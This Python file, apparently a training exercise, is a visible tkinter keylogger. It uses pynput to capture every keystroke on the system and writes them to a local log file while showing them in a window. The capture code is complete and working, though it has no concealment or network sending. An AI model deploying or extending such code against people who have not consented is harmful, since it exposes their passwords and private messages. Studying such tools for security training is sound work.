import tkinter as tk
from tkinter import scrolledtext
from pynput import keyboard
import threading

# Global variable to control the keylogger state
keylogger_active = False

# File to store logged keys
log_file = "PRODIGY_CS_04\keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
        log_area.insert(tk.END, f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")
        log_area.insert(tk.END, f" [{key}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Function to start the keylogger
def start_keylogger():
    global keylogger_active
    keylogger_active = True
    status_label.config(text="Keylogger Status: Running", fg="green")
    threading.Thread(target=listener.start).start()

# Function to stop the keylogger
def stop_keylogger():
    global keylogger_active
    keylogger_active = False
    status_label.config(text="Keylogger Status: Stopped", fg="red")
    listener.stop()

# Create the main window
root = tk.Tk()
root.title("Keylogger")
root.geometry("500x400")

# Create and place the widgets
status_label = tk.Label(root, text="Keylogger Status: Stopped", font=("Helvetica", 12), fg="red")
status_label.pack(pady=10)

start_button = tk.Button(root, text="Start Keylogger", command=start_keylogger, font=("Helvetica", 12))
start_button.pack(pady=5)

stop_button = tk.Button(root, text="Stop Keylogger", command=stop_keylogger, font=("Helvetica", 12))
stop_button.pack(pady=5)

log_label = tk.Label(root, text="Logged Keystrokes:", font=("Helvetica", 12))
log_label.pack(pady=10)

log_area = scrolledtext.ScrolledText(root, width=60, height=10, wrap=tk.WORD, font=("Helvetica", 10))
log_area.pack(pady=10)

# Create the keyboard listener
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release
)

# Run the main event loop
root.mainloop()
